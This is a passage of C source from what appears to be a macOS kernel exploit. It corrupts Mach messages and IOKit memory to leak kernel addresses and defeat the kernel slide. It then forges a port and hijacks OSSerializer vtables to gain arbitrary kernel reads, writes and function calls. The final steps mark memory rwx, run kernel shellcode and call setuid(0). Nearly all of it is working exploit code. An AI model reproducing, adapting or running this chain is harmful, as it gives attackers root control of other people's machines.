    IOConnectCallStructMethod(cmdq, kSubmitCommandBuffers, &submit_args, sizeof(submit_args), 0, 0);

    delete_resource(big_id);
    delete_resource(pad_id);
    delete_resource(pad2_id);
    delete_resource(reset_id);
}

void port_peek_leak(mach_port_t port, void* out, unsigned long outsz, unsigned int off) {
    mach_port_seqno_t seqno = 0;
    char trailer[0x50] = {0};
    mach_msg_type_number_t trailer_sz = sizeof(trailer);
    mach_msg_size_t msg_size = 0;
    mach_msg_id_t msg_id = 0;
    kern_return_t err = mach_port_peek(mach_task_self(), port, 3<<24, &seqno, &msg_size, &msg_id, trailer, &trailer_sz);
    if (err != KERN_SUCCESS)
        die("couldnt mach_port_peek for leak: 0x%x\n", err);
    memcpy(out, &trailer[off], outsz);
}

void increment_ikmq_base(mach_port_t port, mach_port_t fakeport) {
    DESC_COUNT(g_msg) = 0x6c; // increment ikmq_base this much, ikm_header will be first 8 bytes of body
    for (int i = 0; i < DESC_COUNT(g_msg); i++) {
        PORT_DESC(g_msg)[i].name = fakeport;
        PORT_DESC(g_msg)[i].disposition = MACH_MSG_TYPE_COPY_SEND;
        PORT_DESC(g_msg)[i].type = MACH_MSG_PORT_DESCRIPTOR;
    }
    send_msg(port, (void*)&PORT_DESC(g_msg)[DESC_COUNT(g_msg)]-(void*)g_msg, 1);
}

void get_leaks() {
    kern_return_t err;
    // setup mem so we can trash kmsg header
    //          uaf_dbuf --\
    //                     v
    // [osarray pads][kmsg  hdr    ][leak target]
    //
    // set hdr to have msgh_size the appropriate offset so
    // it indexes into the leak target, then use mach_port_peek
    // to leak out the "trailer"

    alloc_osarray(0x8000000-8, CSTR("pad0"), 1); // 128M
    alloc_osarray(0x8000000-8, CSTR("pad1"), 1);
    alloc_osarray(0x8000000-8, CSTR("pad2"), 1);
    alloc_osarray(0x8000000-8, CSTR("pad3"), 1);
    send_msg(port1, MACH_MSG_USZ(0x2000070), 0);

    // leak two adjacent ipc_ports
#define IPC_PORT_SZ 0xa8
#define MAX_PORTS 8192
#define NPORTS_PER 128
    mach_port_t* ports = malloc(MAX_PORTS*sizeof(*ports));
    unsigned long* kports = malloc(MAX_PORTS*sizeof(*kports));
    unsigned int nports = 0, nkports = 0;
    mach_port_t porta = MACH_PORT_NULL, portb = MACH_PORT_NULL;
    unsigned long kporta = 0, kportb = 0;
    for (int iter = 0; iter < MAX_PORTS/NPORTS_PER && !kporta; iter++) {
        DESC_COUNT(g_msg) = NPORTS_PER;
        for (int i = 0; i < NPORTS_PER; i++) {
            mach_port_t p = alloc_port();
            PORT_DESC(g_msg)[i].name = p;
            PORT_DESC(g_msg)[i].disposition = MACH_MSG_TYPE_MAKE_SEND;
            PORT_DESC(g_msg)[i].type = MACH_MSG_PORT_DESCRIPTOR;
            ports[nports++] = p;
        }
        send_msg(port2, MACH_MSG_USZ(0x2000000), 1);
        for (int i = 0; i < NPORTS_PER && !kporta; i += 3) {
            uaf_write64(0, (0x2000e08ul+0x10*i)<<32);
            unsigned long leaks[6] = {0};
            port_peek_leak(port1, &leaks, sizeof(leaks), 0);
            for (int j = 0; j < 3 && i+j < NPORTS_PER && !kporta; j++) {
                unsigned long kport = leaks[j*2];
                if (!KERN_PTR(kport))
                    die("failed to leak kport %d: 0x%lx\n", nkports, kport);
                kports[nkports++] = kport;
                for (int a = 0; a < nkports-1; a++) {
                    int aa = a, bb = nkports-1;
                    if (kports[aa] > kports[bb]) {
                        int tmp = aa;
                        aa = bb;
                        bb = tmp;
                    }
                    if (kports[aa]+IPC_PORT_SZ == kports[bb]) {
                        kporta = kports[aa];
                        kportb = kports[bb];
                        porta = ports[aa];
                        portb = ports[bb];
                        break;
                    }
                }
            }
        }
        recv_msg(port2);
    }
    printf("adjacent ports (alloced %d): 0x%x 0x%lx  0x%x 0x%lx\n", nports, porta, kporta, portb, kportb);
    if (!KERN_PTR(kporta) || !KERN_PTR(kportb))
        die("couldnt leak adjacent ports\n");
    for (int i = 0; i < nports; i++)
        if (ports[i] != porta && ports[i] != portb)
            mach_port_destroy(mach_task_self(), ports[i]);
    free(ports);
    free(kports);

    // leak port1
    DESC_COUNT(g_msg) = 1;
    PORT_DESC(g_msg)->name = port1;
    PORT_DESC(g_msg)->disposition = MACH_MSG_TYPE_MAKE_SEND;
    PORT_DESC(g_msg)->type = MACH_MSG_PORT_DESCRIPTOR;
    send_msg(port2, MACH_MSG_USZ(0x2000000), 1);
    uaf_write64(0, 0x2001004ul<<32);
    unsigned long kport1 = 0;
    port_peek_leak(port1, &kport1, sizeof(kport1), 0);
    printf("kport1: 0x%lx\n", kport1);
    if (!KERN_PTR(kport1))
        die("couldnt leak kport1\n");
    recv_msg(port2);

    // leak an OSData object, but cant be page-aligned (os_data-4 must be mapped)
#define MAX_OSDATA 64
    uaf_write64(0, 0x1801000ul<<32);
    unsigned long os_data = 0;
    for (int iter = 0; iter < MAX_OSDATA; iter++) {
        char valname[0x40];
        alloc_osarray(0x2000000, CSTR("leak"), 1);
        unsigned long tmp = 0;
        port_peek_leak(port1, &tmp, sizeof(tmp), 0);
        printf("leaked OSData 0x%lx\n", tmp);
        if (!KERN_PTR(tmp))
            die("couldnt leak OSData\n");
        if (tmp&0xfff) {
            // good object, remove any pads
            for (int i = 0; i < iter; i++) {
                sprintf(valname, CSTR("leakpad%u"), i);
                free_osarray(valname);
            }
            os_data = tmp;
            break;
        }

        // reset value
        free_osarray(CSTR("leak"));

        // to avoid getting the same exact allocation, allocate some padding objects
        sprintf(valname, CSTR("leakpad%u"), iter);
        alloc_osarray(8, valname, 1);
    }
    printf("OSData: 0x%lx\n", os_data);
    if (!KERN_PTR(os_data))
        die("couldnt get properly aligned OSData\n");

    // prepare for fake port
    // zero qlimit so ip_object.io_lock_data is 0
    mach_port_limits_t limits_info = {0};
    err = mach_port_set_attributes(mach_task_self(), porta, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits_info, MACH_PORT_LIMITS_INFO_COUNT);
    if (err != KERN_SUCCESS)
        die("unable to set qlimit: 0x%x\n", err);
    // seqno overlaps with io_bits, set active bit
    err = mach_port_set_seqno(mach_task_self(), porta, 0x80000000);
    if (err != KERN_SUCCESS)
        die("unable to set seqno: 0x%x\n", err);

    // trash kmsg to create fake port
    uaf_write64(0, MACH_MSG_TYPE_PORT_SEND|MACH_MSGH_BITS_COMPLEX | (0x100ul<<32));
    uaf_write64(0x20, 1); // msgh_descriptor_count
    uaf_write64(0x24, kporta+0x48);
    uaf_write64(0x2c, (MACH_MSG_PORT_DESCRIPTOR<<24)|(MACH_MSG_TYPE_PORT_SEND<<16));
    // receive fake port descriptor
    recv_msg(port1);
    if (!(g_msg->msgh_bits & MACH_MSGH_BITS_COMPLEX))
        die("msgh_bits not complex: 0x%x\n", g_msg->msgh_bits);
    if (DESC_COUNT(g_msg) != 1)
        die("expected fake msg to have 1 descriptor: %d\n", DESC_COUNT(g_msg));
    if (PORT_DESC(g_msg)->type != MACH_MSG_PORT_DESCRIPTOR)
        die("expected fake msg to have a port descriptor: 0x%x\n", PORT_DESC(g_msg)->type);
    mach_port_t fakeport = PORT_DESC(g_msg)->name;
    printf("fakeport: 0x%x\n", fakeport);

    // queue a message on b, increment ikmq_base, then get text leak
    *(unsigned long*)(g_msg+1) = os_data-4;
    send_msg(portb, 0x48, 0);
    increment_ikmq_base(port2, fakeport);
    // the fake ikm_header points at os_data-4 (which is guaranteed to be mapped)
    // this will make the low 4 bytes of the vtable msgh_size
    // msgh_bits (which is os_data-4) may have the complex bit set, but in that case,
    // msgh_descriptor_count will overlap with OSData.capacity, which is 0
    // trying to receive this message with too small of a buffer will write out the length (minus 8),
    // leaking the low 4 bytes of the vtable
    err = mach_msg(g_msg, MACH_RCV_MSG|MACH_RCV_LARGE, 0, 0x10, portb, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (err != MACH_RCV_TOO_LARGE)
        die("expected MACH_RCV_TOO_LARGE: 0x%x\n", err);
    if (g_msg->msgh_size == 0x48)
        die("didnt increment ikmq_base...\n");
    unsigned long vtbl = 0xffffff8000000000|((unsigned long)g_msg->msgh_size+8);
    printf("OSData vtable: 0x%lx\n", vtbl);
    kernel_slide = vtbl-0x10-find_sym(CSTR("_ZTV6OSData"));
    printf("kernel_slide: 0x%lx\n", kernel_slide);
    if (kernel_slide&0xfff)
        die("invalid kernel slide\n");
    ret_gadg += kernel_slide;
    // decrement ikmq_base back to normal, unqueue msg from b
    recv_msg(port2);
    recv_msg(portb);

    // we now use mach_port_peek to leak from a fake ikm_header
    // abusing the copy of the "trailer" from ikm_header+ikm_header->msgh_size

    // alloc large msg on port1
    send_msg(port1, MACH_MSG_USZ(0x2000070), 0);
    // leak ikmq_base of port1
    *(unsigned long*)(g_msg+1) = kport1+0x30; // msgh_size will be zero, overlaps empty waitq stuff
    send_msg(portb, 0x48, 0);
    increment_ikmq_base(port2, fakeport);
    unsigned long ikmq_base = 0;
    port_peek_leak(portb, &ikmq_base, sizeof(ikmq_base), 0x10);
    printf("ikmq_base: 0x%lx\n", ikmq_base);
    if (!KERN_PTR(ikmq_base))
        die("couldnt leak ikmq_base\n");
    recv_msg(port2);
    recv_msg(portb);

    // again use mach_port_peek to leak ikmu_data of port1, which is at a constant offset from our iokit buffers
    *(unsigned long*)(g_msg+1) = ikmq_base; // msgh_size will be 0 (overlaps ikm_ppriority)
    send_msg(portb, 0x48, 0);
    increment_ikmq_base(port2, fakeport);
    unsigned long ikmu_data = 0;
    port_peek_leak(portb, &ikmu_data, sizeof(ikmu_data), 0x18);
    if (!KERN_PTR(ikmu_data))
        die("couldnt leak ikmu_data: 0x%lx\n", ikmu_data);
    kdbuf0 = ikmu_data-0x20000000-dbuf0.size;
    printf("kdbuf0: 0x%lx\n", kdbuf0);
    recv_msg(port2);
    recv_msg(portb);
    recv_msg(port1);

    // safely destroy fake port
    // if the port doesnt have the active bit set, the destroy just removes the port from the space
    // without doing anything destructive
    err = mach_port_set_seqno(mach_task_self(), porta, 0);
    if (err != KERN_SUCCESS)
        die("couldnt unset active bit to destroy fakeport: 0x%x\n", err);
    mach_port_destroy(mach_task_self(), fakeport);

    free_osarray(CSTR("leak"));

    mach_port_destroy(mach_task_self(), porta);
    mach_port_destroy(mach_task_self(), portb);
}

void setup_for_kfunc_call() {
    // readjust padding so we can alloc an OSArray on uaf_dbuf
    free_osarray(CSTR("pad3"));
    alloc_osarray(0x4000000, CSTR("pad3"), 1);
    alloc_osarray(0x4800000, CSTR("pad4"), 1);
    alloc_osarray(0x2000000, CSTR("pwn"), 2); // overlaps uaf_dbuf
    // first entry triggers call, 2nd null causes bailout of OSArray::initWithObjects
    uaf_write64(0, kdbuf0);
    uaf_write64(8, 0);

    // first OSSerializer::serialize call recurses to control third argument
    unsigned long serialize = find_sym(CSTR("_ZNK12OSSerializer9serializeEP11OSSerialize"));
    struct OSSerializer* serializer = (void*)dbuf0.addr;
    serializer->vtable = kdbuf0+0x1000;
    serializer->callback = serialize;
    serializer->target = kdbuf0+0x2000;

    // taggedRetain triggers call, nop taggedRelease
    struct OSObject_vtbl* serializer_vtbl = (void*)dbuf0.addr+0x1000;
    serializer_vtbl->taggedRetain = serialize;
    serializer_vtbl->taggedRelease = ret_gadg;
}
void kfunc_call(unsigned long func, unsigned long a0, unsigned long a1, unsigned long a2) {
    struct OSSerializer* serializer = (void*)dbuf0.addr;
    serializer->ref = a2;
    struct OSSerializer* serializer2 = (void*)dbuf0.addr+0x2000;
    serializer2->callback = func;
    serializer2->target = a0;
    serializer2->ref = a1;
    get_surface_val(CSTR("pwn"));
}
void arb_write(unsigned long addr, void* data, unsigned long sz) {
    kfunc_call(find_sym(CSTR("copyin")), (unsigned long)data, addr, sz);
}
void arb_read(unsigned long addr, void* data, unsigned long sz) {
    kfunc_call(find_sym(CSTR("copyout")), addr, (unsigned long)data, sz);
}

unsigned long alloc_kernel_payload(unsigned long kernel_map, void* pl, unsigned long size) {
    *(unsigned long*)(dbuf0.addr+0x3000) = 0;
    kfunc_call(find_sym(CSTR("kmem_alloc_external")), kernel_map, kdbuf0+0x3000, size);
    unsigned long kaddr = *(unsigned long*)(dbuf0.addr+0x3000);
    if (!KERN_PTR(kaddr))
        die("couldnt alloc kernelspace payload: 0x%lx\n", kaddr);
    arb_write(kaddr, pl, size);
    return kaddr;
}

void code_exec(void* sc, unsigned long sc_len) {
    unsigned long kernel_map = 0;
    arb_read(find_sym(CSTR("kernel_map")), &kernel_map, sizeof(kernel_map));
    if (!KERN_PTR(kernel_map))
        die("couldnt leak kernel_map: 0x%lx\n", kernel_map);
    unsigned long ksc = alloc_kernel_payload(kernel_map, sc, sc_len);
    printf("ksc: 0x%lx\n", ksc);

    *(unsigned long*)(dbuf0.addr+0x3000) = 0;
    kfunc_call(find_sym(CSTR("vm_map_store_lookup_entry")), kernel_map, ksc, kdbuf0+0x3000);
    unsigned long map_ent = *(unsigned long*)(dbuf0.addr+0x3000);
    printf("map_ent: 0x%lx\n", map_ent);
    if (!KERN_PTR(map_ent))
        die("couldnt get map entry\n");

    // set the bitfield for protection to rwx
    unsigned int cur_val = 0;
    arb_read(map_ent+0x48, &cur_val, sizeof(cur_val));
    cur_val |= 7<<7;
    arb_write(map_ent+0x48, &cur_val, sizeof(cur_val));

    // setup imports
    struct kimports kimports = {0};
#define KIMP_RESOLVE(typ, name, ...) kimports.val64_##name = find_sym(CSTR(#name));
    FOR_EACH_KIMP(KIMP_RESOLVE);
#undef KIMP_RESOLVE

    unsigned long kimpaddr = alloc_kernel_payload(kernel_map, &kimports, sizeof(kimports));
    kfunc_call(ksc, kimpaddr, 34, 51);
}

void cleanup() {
    uaf_write64(0, 0); // null fake OSArray entry
    delete_surface(surf_id);
    IOServiceClose(sroot_svc);
    IOServiceClose(vidctx_main);
    IOServiceClose(vidctx_main2);
    IOServiceClose(shared_client);
    IOServiceClose(cmdq);
    IONotificationPortDestroy(notifi_ref);
    IOObjectRelease(accel_svc);
    IOObjectRelease(sroot_svc);
    munmap(bigmem, 0x800000000);
    munmap(g_msg, MACH_MSG_MAX+MAX_TRAILER_SZ);
    mach_port_destroy(mach_task_self(), port1);
    mach_port_destroy(mach_task_self(), port2);
    munmap(kfile, kfile_sz);
}

void exploit() {
    parse_kernel_macho();
    mach_msg_setup();
    iosurface_setup();
    vidctx_setup();
    cmdq_setup();

    fill_bigmem();
    fill_kernel_map(); // fill footprint-sized holes in kernel map, leaving holes for smaller allocations
    alloc_dbuf0();
    alloc_corpse(); // alloc footprint after oob buffer
    alloc_uaf_dbuf(); // alloc iokit pageable map after footprint with just uaf_dbuf
    oob_write32(0x800000 + 0x20000000); // footprint consumes iokit map
    mach_port_destroy(mach_task_self(), corpse); // free enlarged footprint

    get_leaks();

    setup_for_kfunc_call();
    free_kernel_map_fillers();
    code_exec(kernel_sc_bin, sizeof(kernel_sc_bin));
    setuid(0);

    cleanup();
}
